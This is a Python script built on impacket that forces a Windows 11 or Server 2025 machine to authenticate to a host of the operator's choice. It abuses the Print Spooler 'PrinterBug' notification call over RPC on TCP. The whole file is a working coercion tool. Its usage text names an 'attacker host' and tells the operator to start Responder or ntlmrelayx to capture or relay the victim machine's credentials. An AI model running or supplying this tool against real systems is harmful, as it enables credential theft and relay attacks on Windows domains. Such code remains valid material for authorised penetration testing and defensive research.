#!/usr/bin/env python3
"""
Pure RPC over TCP example for Print Spooler on Windows 11 22H2+ / Server 2025
Uses direct TCP/IP RPC transport (ncacn_ip_tcp) - the new default for spoolss
Based on https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
"""

from impacket.dcerpc.v5 import transport, rprn
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_CONNECT
from impacket.dcerpc.v5.dtypes import NULL
import logging
import sys

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class RpcTcpPrinterTrigger:
    def __init__(self, target_host, username='', password='', domain='', remote_host=None, tcp_port=None):
        self.target_host = target_host
        self.username = username
        self.password = password
        self.domain = domain
        self.remote_host = remote_host if remote_host else target_host
        self.tcp_port = tcp_port  # Optional specific port, otherwise dynamic
        
    def trigger_rpc_backconnect(self):
        """
        Trigger RPC backconnect using RPC over TCP (Windows 11/Server 2025 default)
        """
        try:
            # Build RPC over TCP connection string
            if self.tcp_port:
                # Use specific port if provided
                stringbinding = f'ncacn_ip_tcp:{self.target_host}[{self.tcp_port}]'
                logging.info(f'Using specified port: {self.tcp_port}')
            else:
                # Use dynamic port (will query endpoint mapper automatically)
                stringbinding = f'ncacn_ip_tcp:{self.target_host}'
                logging.info('Using dynamic port resolution via endpoint mapper')
            
            logging.info(f'Connecting to {stringbinding}')
            
            # Create RPC transport
            rpctransport = transport.DCERPCTransportFactory(stringbinding)
            
            # Set credentials if provided
            if self.username and self.password:
                rpctransport.set_credentials(self.username, self.password, self.domain)
                logging.info(f'Using credentials: {self.domain}\\{self.username}')
            else:
                logging.info('Using anonymous/null session')
            
            # Get DCE/RPC connection
            dce = rpctransport.get_dce_rpc()
            
            # Set authentication level on the DCE connection
            if self.username and self.password:
                dce.set_auth_level(RPC_C_AUTHN_LEVEL_CONNECT)
                #dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            
            # Connect
            logging.info('Establishing RPC over TCP connection...')
            dce.connect()
            logging.info('Connected successfully via RPC over TCP')
            
            # Bind to the Print Spooler interface (MS-RPRN)
            logging.info('Binding to Print Spooler (MS-RPRN) interface...')
            dce.bind(rprn.MSRPC_UUID_RPRN)
            logging.info('Bound successfully to spoolss via RPC over TCP!')
            
            # Open printer handle
            logging.info(f'Opening printer handle for \\\\{self.target_host}')
            try:
                resp = rprn.hRpcOpenPrinter(dce, '\\\\%s\x00' % self.target_host)
                
            except Exception as e:
                error_str = str(e)
                if 'Broken pipe' in error_str:
                    logging.error('Connection failed - broken pipe')
                    return False
                elif 'ACCESS_DENIED' in error_str.upper():
                    logging.error('Access denied - insufficient privileges')
                    dce.disconnect()
                    return False
                elif 'RPC_S_SERVER_UNAVAILABLE' in error_str.upper():
                    logging.error('Print Spooler service not available')
                    dce.disconnect()
                    return False
                else:
                    logging.error(f'Failed to open printer: {e}')
                    raise
            
            logging.info('Got printer handle successfully')
            #text = input("-hit enter-")   
            # Create notification request
            logging.info(f'Creating change notification pointing to \\\\{self.remote_host}')
            request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
            request['hPrinter'] = resp['pHandle']
            request['fdwFlags'] = rprn.PRINTER_CHANGE_ADD_JOB
            
            request['pszLocalMachine'] =  '\\\\%s\x00' % self.remote_host
            request['pOptions'] = NULL
            
            # Send the request
            try:
                logging.info('Sending RPC request to trigger backconnect...')
                resp = dce.request(request)
                logging.info('RPC request completed successfully')
            except Exception as e:
                logging.warning(f'RPC request exception (may be expected): {e}')
            
            logging.info(f'[SUCCESS] Triggered RPC backconnect to \\\\{self.remote_host}')
            logging.info('Check your listener/Responder for incoming authentication!')
            
            # Cleanup
            dce.disconnect()
            logging.info('Disconnected from target')
            
            return True
            
        except Exception as e:
            error_str = str(e)
            if 'abstract_syntax_not_supported' in error_str:
                logging.error('Print Spooler not listening on RPC over TCP')
                logging.error('The target may be Windows Server 2022 or older')
                logging.error('Try enabling RPC over TCP on the target or use RPC over Named Pipes')
                return False
            else:
                logging.error(f'Error during RPC operation: {e}')
                return False


def print_banner():
    print("=" * 70)
    print("Pure RPC over TCP Printer Spooler Trigger")
    print("For Windows 11 22H2+ / Windows Server 2025")
    print("=" * 70)


def main():
    if len(sys.argv) < 2:
        print_banner()
        print(f"\nUsage: {sys.argv[0]} <target_host> [username] [password] [domain] [attacker_host] [tcp_port]")
        print("\nExamples:")
        print(f"  # Anonymous connection")
        print(f"  {sys.argv[0]} 192.168.1.100")
        print(f"\n  # With credentials")
        print(f"  {sys.argv[0]} 192.168.1.100 admin Password123 DOMAIN")
        print(f"\n  # Trigger backconnect to different host (attacker)")
        print(f"  {sys.argv[0]} 192.168.1.100 admin Password123 DOMAIN 192.168.1.50")
        print(f"\n  # Use specific RPC port")
        print(f"  {sys.argv[0]} 192.168.1.100 admin Password123 DOMAIN 192.168.1.50 49152")
        print("\nNotes:")
        print("  - Target must be Windows 11 22H2+ or Server 2025 (RPC over TCP default)")
        print("  - For older versions, spoolss uses RPC over Named Pipes (SMB)")
        print("  - Ensure ports 135 and dynamic RPC ports (49152-65535) are open")
        print("  - Start Responder or ntlmrelayx on remote_host to capture auth")
        sys.exit(1)
    
    target_host = sys.argv[1]
    username = sys.argv[2] if len(sys.argv) > 2 else ''
    password = sys.argv[3] if len(sys.argv) > 3 else ''
    domain = sys.argv[4] if len(sys.argv) > 4 else ''
    remote_host = sys.argv[5] if len(sys.argv) > 5 else None
    tcp_port = int(sys.argv[6]) if len(sys.argv) > 6 else None
    
    print_banner()
    print(f"Target Host:  {target_host}")
    print(f"Attacker Host:  {remote_host if remote_host else target_host}")
    print(f"Credentials:  {domain}\\{username}" if username else "Credentials:  Anonymous")
    print(f"TCP Port:     {tcp_port if tcp_port else 'Dynamic (via endpoint mapper)'}")
    print("=" * 70)
    print()
    
    trigger = RpcTcpPrinterTrigger(
        target_host=target_host,
        username=username,
        password=password,
        domain=domain,
        remote_host=remote_host,
        tcp_port=tcp_port
    )
    
    success = trigger.trigger_rpc_backconnect()
    
    print()
    if success:
        print("[+] Operation completed successfully!")
        print("[+] Check your listener for incoming authentication from target")
    else:
        print("[-] Operation failed - see error messages above")
        print("\nTroubleshooting:")
        print("  1. Ensure target is Windows 11 22H2+ or Server 2025")
        print("  2. Check firewall allows RPC (port 135 + dynamic ports)")
        print("  3. Verify Print Spooler service is running")
        print("  4. For older Windows, spoolss uses Named Pipes (not TCP)")
        sys.exit(1)


if __name__ == '__main__':
    main()

